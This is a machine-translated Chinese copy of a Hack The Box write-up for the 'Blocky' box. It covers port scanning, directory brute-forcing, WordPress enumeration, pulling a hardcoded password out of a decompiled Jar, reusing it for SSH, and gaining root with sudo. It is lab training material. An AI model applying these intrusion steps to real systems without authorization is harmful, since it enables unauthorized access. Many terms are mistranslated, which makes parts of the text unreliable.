# 高温透射率：块状

[0xdf.gitlab.io](https://0xdf.gitlab.io/2020/06/30/htb-blocky.html)0xdf黑客的东西

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fblocky-cover.png) 

Blocky确实是一个简单的盒子，但在枚举时确实需要一些纪律。很容易错过托管两个 Java Jar 文件的 /插件路径。从其中一个文件中，我会找到信誉，这些信誉由用户在盒子上重复使用，使我能够获得SSH访问权限。要升级到 root，允许用户使用 sudo 和密码运行任何命令，我将使用该命令 su 以 root 身份返回会话。

## 箱子信息

名字

[块状](https://www.hackthebox.eu/home/machines/profile/48) ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Ficons%2Fbox-blocky.png) 

发行日期

21 7月 2017

停用日期

9 12月 2017

操作系统

操作系统 ![](https://image.cubox.pro/article/2022091809192232808/86382.jpg) 

基本点

简易 \[20\]

额定难度

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fblocky-diff.png) 

雷达图

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fblocky-radar.png) 

 ![](https://image.cubox.pro/article/2022091809192294225/76393.jpg) 

00天 03小时 33分 23秒。[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F2846)](https://www.hackthebox.eu/home/users/profile/2846)

 ![](https://image.cubox.pro/article/2022091809192276507/23214.jpg) 

00天 03小时 35分钟 15秒。[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F2846)](https://www.hackthebox.eu/home/users/profile/2846)

造物主

[![](https://image.cubox.pro/article/2022091814331845169/20404.jpg)](https://www.hackthebox.eu/home/users/profile/2904)-

## 侦察

### n地图

`nmap`找到三个开放的 TCP 端口，FTP （21），固态混合硬盘 （22） 和 HTTP （80）：

    root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.37
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-26 15:11 EDT
    Nmap scan report for 10.10.10.37
    Host is up (0.073s latency).
    Not shown: 65531 filtered ports
    PORT      STATE  SERVICE
    21/tcp    open   ftp
    22/tcp    open   ssh
    80/tcp    open   http
    25565/tcp closed minecraft
    
    Nmap done: 1 IP address (1 host up) scanned in 14.00 seconds
    
    root@kali# nmap -p 21,22,80 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.37
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-26 15:13 EDT
    Nmap scan report for 10.10.10.37
    Host is up (0.015s latency).
    
    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     ProFTPD 1.3.5a
    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
    |   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
    |_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    |_http-generator: WordPress 4.8
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: BlockyCraft &#8211; Under Construction!
    Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 8.22 seconds
    

基于[开放SSH](https://packages.ubuntu.com/search?keywords=openssh-server)和[阿帕奇](https://packages.ubuntu.com/search?keywords=apache2)版本，主机可能运行的是Ubuntu 16.04 Xenial。TCP 25565也发生了一些有趣的事情，因为它的报告已关闭。我稍后会检查出来。

### FTP - 三通 21

FTP最终成为一条死胡同。我看过两条路：

*   匿名登录 - 通常擅长识别这一点，但我尝试以防万一，它失败了。`nmap`
*   漏洞利用 - 将其标识为专业版 1.3.5a。谷歌搜索都没有发现这个版本中的任何漏洞，我无需身份验证即可利用这些漏洞。1.3.5 中存在一个[文件复制漏洞](https://www.exploit-db.com/exploits/36742)，此漏洞可能适用于此处。如果我找到有效的信誉，我会回来的。`nmap``searchsploit`

### 网站 - TCP 80

#### 网站

该网站是一个“正在建设中”的MinCraft博客页面。

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200626152945290.png) 

如果主题和感觉没有放弃它，在页面底部它说它是WordPress：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200626153028554.png) 

进入唯一的帖子，我可以看到发布它的用户名为notch，我将在以后注意：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200626154837527.png) 

#### 目录暴力破解

我将针对该网站运行，并包括，因为我知道该网站是PHP：`gobuster``-x php`

    root@kali# gobuster dir -u http://10.10.10.37 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 40 -o scans/gob
    uster-root-medium
    ===============================================================
    Gobuster v3.0.1
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
    ===============================================================
    [+] Url:            http://10.10.10.37
    [+] Threads:        40
    [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Status codes:   200,204,301,302,307,401,403
    [+] User Agent:     gobuster/3.0.1
    [+] Extensions:     php
    [+] Timeout:        10s
    ===============================================================
    2020/06/26 15:34:53 Starting gobuster
    ===============================================================
    /wiki (Status: 301)
    /wp-content (Status: 301)
    /wp-login.php (Status: 200)
    /plugins (Status: 301)
    /wp-includes (Status: 301)
    /index.php (Status: 301)
    /javascript (Status: 301)
    /wp-trackback.php (Status: 200)
    /wp-admin (Status: 301)
    /phpmyadmin (Status: 301)
    /wp-signup.php (Status: 302)
    /server-status (Status: 403)
    ===============================================================
    2020/06/26 15:38:17 Finished
    ===============================================================
    

从该列表中，我将检查出 、 和 。我还想跑去探索WordPress特定的东西。`/wiki``/plugins``/phpmyadmin``wpscan`

#### /维基

这个页面只是文本说它不存在，一旦主服务器插件完成，它就会出现，然后是插件的一些描述：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200626153712976.png) 

#### /菲律宾比索管理员

这是一个看起来很正常的php我的管理员登录：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200626153753146.png) 

如果我找到信誉，我会回来检查。

#### 断续器

我在这里跑了：`wpscan`

    root@kali# wpscan --url http://10.10.10.37 -e ap,t,tt,u | tee scans/wpscan 
    _______________________________________________________________
             __          _______   _____
             \ \        / /  __ \ / ____|
              \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
               \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
                \  /\  /  | |     ____) | (__| (_| | | | |
                 \/  \/   |_|    |_____/ \___|\__,_|_| |_|
    
             WordPress Security Scanner by the WPScan Team
                             Version 3.8.2
           Sponsored by Automattic - https://automattic.com/
           @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
    _______________________________________________________________
    
    [+] URL: http://10.10.10.37/ [10.10.10.37]
    
    Interesting Finding(s):
    
    [+] Headers
     | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
     | Found By: Headers (Passive Detection)
     | Confidence: 100%
    
    [+] XML-RPC seems to be enabled: http://10.10.10.37/xmlrpc.php
     | Found By: Direct Access (Aggressive Detection)
     | Confidence: 100%
     | References:
     |  - http://codex.wordpress.org/XML-RPC_Pingback_API
     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
     |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
    
    [+] http://10.10.10.37/readme.html
     | Found By: Direct Access (Aggressive Detection)
     | Confidence: 100%
    
    [+] Upload directory has listing enabled: http://10.10.10.37/wp-content/uploads/
     | Found By: Direct Access (Aggressive Detection)
     | Confidence: 100%
    
    [+] The external WP-Cron seems to be enabled: http://10.10.10.37/wp-cron.php
     | Found By: Direct Access (Aggressive Detection)
     | Confidence: 60%
     | References:
     |  - https://www.iplocation.net/defend-wordpress-from-ddos
     |  - https://github.com/wpscanteam/wpscan/issues/1299
    
    [+] WordPress version 4.8 identified (Insecure, released on 2017-06-08).
     | Found By: Rss Generator (Passive Detection)
     |  - http://10.10.10.37/index.php/feed/, <generator>https://wordpress.org/?v=4.8</generator>
     |  - http://10.10.10.37/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.8</generator>
    
    [+] WordPress theme in use: twentyseventeen
     | Location: http://10.10.10.37/wp-content/themes/twentyseventeen/
     | Last Updated: 2020-03-31T00:00:00.000Z
     | Readme: http://10.10.10.37/wp-content/themes/twentyseventeen/README.txt
     | [!] The version is out of date, the latest version is 2.3
     | Style URL: http://10.10.10.37/wp-content/themes/twentyseventeen/style.css?ver=4.8
     | Style Name: Twenty Seventeen
     | Style URI: https://wordpress.org/themes/twentyseventeen/
     | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
     | Author: the WordPress team
     | Author URI: https://wordpress.org/
     |
     | Found By: Css Style In Homepage (Passive Detection)
     |
     | Version: 1.3 (80% confidence)
     | Found By: Style (Passive Detection)
     |  - http://10.10.10.37/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: 'Version: 1.3'
    
    [+] Enumerating All Plugins (via Passive Methods)
    
    [i] No plugins Found.
    
    [+] Enumerating Most Popular Themes (via Passive and Aggressive Methods)
    
     Checking Known Locations -: |==============================================================================================================================================================================================================================================|
    [+] Checking Theme Versions (via Passive and Aggressive Methods)
    
    [i] Theme(s) Identified:
    
    [+] twentyfifteen
     | Location: http://10.10.10.37/wp-content/themes/twentyfifteen/
     | Last Updated: 2020-03-31T00:00:00.000Z
     | Readme: http://10.10.10.37/wp-content/themes/twentyfifteen/readme.txt
     | [!] The version is out of date, the latest version is 2.6
     | Style URL: http://10.10.10.37/wp-content/themes/twentyfifteen/style.css
     | Style Name: Twenty Fifteen
     | Style URI: https://wordpress.org/themes/twentyfifteen/
     | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
     | Author: the WordPress team
     | Author URI: https://wordpress.org/
     |
     | Found By: Known Locations (Aggressive Detection)
     |  - http://10.10.10.37/wp-content/themes/twentyfifteen/, status: 500
     |
     | Version: 1.8 (80% confidence)
     | Found By: Style (Passive Detection)
     |  - http://10.10.10.37/wp-content/themes/twentyfifteen/style.css, Match: 'Version: 1.8'
    
    [+] twentyseventeen
     | Location: http://10.10.10.37/wp-content/themes/twentyseventeen/
     | Last Updated: 2020-03-31T00:00:00.000Z
     | Readme: http://10.10.10.37/wp-content/themes/twentyseventeen/README.txt
     | [!] The version is out of date, the latest version is 2.3
     | Style URL: http://10.10.10.37/wp-content/themes/twentyseventeen/style.css
     | Style Name: Twenty Seventeen
     | Style URI: https://wordpress.org/themes/twentyseventeen/
     | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
     | Author: the WordPress team
     | Author URI: https://wordpress.org/
     |
     | Found By: Urls In Homepage (Passive Detection)
     | Confirmed By: Known Locations (Aggressive Detection)
     |  - http://10.10.10.37/wp-content/themes/twentyseventeen/, status: 500
     |
     | Version: 1.3 (80% confidence)
     | Found By: Style (Passive Detection)
     |  - http://10.10.10.37/wp-content/themes/twentyseventeen/style.css, Match: 'Version: 1.3'
    
    [+] twentysixteen
     | Location: http://10.10.10.37/wp-content/themes/twentysixteen/
     | Last Updated: 2020-03-31T00:00:00.000Z
     | Readme: http://10.10.10.37/wp-content/themes/twentysixteen/readme.txt
     | [!] The version is out of date, the latest version is 2.1
     | Style URL: http://10.10.10.37/wp-content/themes/twentysixteen/style.css
     | Style Name: Twenty Sixteen
     | Style URI: https://wordpress.org/themes/twentysixteen/
     | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead ...
     | Author: the WordPress team
     | Author URI: https://wordpress.org/
     |
     | Found By: Known Locations (Aggressive Detection)
     |  - http://10.10.10.37/wp-content/themes/twentysixteen/, status: 500
     |
     | Version: 1.3 (80% confidence)
     | Found By: Style (Passive Detection)
     |  - http://10.10.10.37/wp-content/themes/twentysixteen/style.css, Match: 'Version: 1.3'
    
    [+] Enumerating Timthumbs (via Passive and Aggressive Methods)
    
     Checking Known Locations -: |==============================================================================================================================================================================================================================================|
    
    [i] No Timthumbs Found.
    
    [+] Enumerating Users (via Passive and Aggressive Methods)
    
     Brute Forcing Author IDs -: |==============================================================================================================================================================================================================================================|
    
    [i] User(s) Identified:
    
    [+] notch
     | Found By: Author Posts - Author Pattern (Passive Detection)
     | Confirmed By:
     |  Wp Json Api (Aggressive Detection)
     |   - http://10.10.10.37/index.php/wp-json/wp/v2/users/?per_page=100&page=1
     |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
     |  Login Error Messages (Aggressive Detection)
    
    [+] Notch
     | Found By: Rss Generator (Passive Detection)
     | Confirmed By: Login Error Messages (Aggressive Detection)
    
    [!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
    [!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up
    
    [+] Requests Done: 2989
    [+] Cached Requests: 66
    [+] Data Sent: 742.701 KB
    [+] Data Received: 418.53 KB
    [+] Memory used: 227.039 MB
    [+] Elapsed time: 00:00:13
    

Strangely, there are no plugins found. It does identify the notch user I noted earlier on the site.

#### /plugins

It would be easy to skip this as a WordPress directory, but visiting this page shows a title of “Cute file browser” and it’s actually hosting two Java Jar files:

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200626154102929.png) 

我将下载它们。

## 壳体作为缺口

### 反向罐

我将打开每个罐子（可以使用）。首先，我看了.它超级简单，只有一个类和几个空函数。它对SQL也有一些信誉：`jd-gui``apt install jd-gui``BlockCore.jar`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200626162015610.png) 

我可以查看其他 Jar，但它有很多类：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200626162131442.png) 

我想知道这是HTB的自定义代码，还是公开可用的代码。我拿了一个MD5的罐子，并用谷歌搜索了它。只有一个结果（与我得到的谷歌[打击](https://en.wikipedia.org/wiki/Googlewhack)一样接近）：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200626162324296.png) 

这是来自明克拉夫特锻造的一个名为“悲伤预防”的插件，它与磁盘上的名称相匹配。这足以让我认为这暂时不重要。我可以在此插件中查找漏洞，但对于一个简单的框，这可能不是路径。

### 固态混合苯

我现在有两个用户名（缺口和根）和一个密码（8YsqfCTnvxAUeduzjNSXe22）。我将在我迄今为止确定的所有服务上尝试它们，但是它们在我尝试的第一个SSH上工作：

    root@kali# sshpass -p 8YsqfCTnvxAUeduzjNSXe22 ssh notch@10.10.10.37
    Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
    
     * Documentation:  https://help.ubuntu.com
     * Management:     https://landscape.canonical.com
     * Support:        https://ubuntu.com/advantage
    
    7 packages can be updated.
    7 updates are security updates.
    
    
    Last login: Tue Jul 25 11:14:53 2017 from 10.10.14.230
    notch@Blocky:~$ 
    

我可以抓住：`user.txt`

    notch@Blocky:~$ cat user.txt 
    59fee097************************
    

对于其他服务，我尝试了：

服务

结果

访问

下一步

断续器

成功作为缺口

缺口主目录（包括`user.txt`)

可以上传SSH密钥并获取外壳作为缺口。

/wp-管理员

失败，因为两者

没有

不适用

我微

成功为根

数据库，包括文字压缩

可以更改密钥，获得WP管理员访问权限，并制作网络外壳，从而提供w数据访问权限

## Priv： 缺口 –> 根

这可能是我在HTB上看到的最简单的根。 要求输入密码，但我有密码：`sudo -l`

    notch@Blocky:~$ sudo -l
    [sudo] password for notch: 
    Matching Defaults entries for notch on Blocky:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User notch may run the following commands on Blocky:
        (ALL : ALL) ALL
    

我可以用缺口运行任何东西。所以我会选择，我是根：`sudo``bash`

    notch@Blocky:~$ sudo su - 
    root@Blocky:~#
    

我会抓住：`root.txt`

    root@Blocky:~# cat root.txt 
    0a9694a5************************
    

我怀疑我也可以在这里使用内核漏洞，但我会把它留给读者作为练习。

[查看原网页: 0xdf.gitlab.io](https://0xdf.gitlab.io/2020/06/30/htb-blocky.html)